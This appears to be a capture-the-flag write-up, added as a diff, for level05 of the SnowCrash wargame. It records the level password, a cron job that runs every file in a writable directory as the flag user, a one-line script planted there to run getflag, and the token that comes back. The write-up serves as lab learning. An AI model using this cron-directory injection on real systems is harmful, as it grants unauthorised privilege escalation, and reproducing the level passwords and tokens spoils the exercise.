@@ -1,0 +1,42 @@
+su level05
+pass : ne2searoevaevoem4ov4ar8ap
+
+
+You have new mail.
+
+level05@SnowCrash:~$ ls -la
+total 12
+dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 .
+d--x--x--x  1 root    users    340 Aug 30  2015 ..
+-r-x------  1 level05 level05  220 Apr  3  2012 .bash_logout
+-r-x------  1 level05 level05 3518 Aug 30  2015 .bashrc
+-r-x------  1 level05 level05  675 Apr  3  2012 .profile
+
+Following up on the clue about having a new mail :
+
+level05@SnowCrash:~$ find / -name mail 2> /dev/null
+/usr/lib/byobu/mail
+/var/mail
+/var/spool/mail
+/rofs/usr/lib/byobu/mail
+/rofs/var/mail
+/rofs/var/spool/mail
+
+level05@SnowCrash:~$ cat /var/mail/level05 
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+Script that execute all file in /opt/openarenaserver (if it takes longer than 5 sec, it moves on) then remove it
+level05@SnowCrash:~$ echo "getflag > /tmp/plop" > /opt/openarenaserver/plop.sh
+
+Wait a minute or so 
+
+level05@SnowCrash:~$ cat /tmp/plop
+Check flag.Here is your token : viuaaale9huek52boumoomioc
